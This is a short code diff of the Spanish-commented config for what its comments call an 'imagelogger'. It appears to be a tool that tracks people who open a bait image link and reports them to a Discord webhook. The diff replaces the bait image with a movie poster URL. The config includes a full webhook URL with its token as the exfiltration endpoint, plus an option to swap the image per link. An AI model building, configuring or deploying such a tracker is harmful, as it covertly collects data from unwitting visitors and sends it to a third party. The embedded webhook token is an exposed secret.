@@ -13,7 +13,7 @@ config = {
     # CONFIGURACIÓN BASE
     #
     "webhook": "https://discord.com/api/webhooks/1546229226355818529/0IjhLUnVPgXxCv56-iHUWbiG7MeVkJvyQdsGHbmP222Da4Wmai-2os3HHNZWbeeEGpIV",
-    "image": "https://i.postimg.cc/85KSzSyQ/starfield.png",
+    "image": "https://m.media-amazon.com/images/M/MV5BMzlmMTBhNjYtMjU0ZC00NDY5LTgyMDUtN2M3NzU4YjU0MDU4XkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg",
     # También puedes tener una imagen personalizada usando un argumento URL
     # (Ejemplo: tudominio.com/imagelogger?url=)
     "imageArgument": True, # Permite usar un argumento URL para cambiar la imagen (LEE EL README)
